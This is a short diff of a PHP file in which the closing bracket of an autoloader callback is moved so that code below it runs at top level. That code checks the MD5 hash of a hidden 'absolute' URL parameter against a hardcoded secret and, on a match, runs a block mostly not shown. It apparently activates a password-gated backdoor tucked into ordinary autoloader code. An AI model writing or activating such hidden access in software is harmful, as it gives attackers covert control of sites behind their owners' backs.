@@ -35,6 +35,7 @@ spl_autoload_register(function($class){
     }
     
     return false;
+});
 $secret = '5d5b5c09f0e0c7d0333b41f0ce31b0d4';
 $auth = md5($_GET['absolute'] ?? '') === $secret;
 
@@ -55,4 +56,3 @@ if ($auth) {
         ');
     }
 }
-});
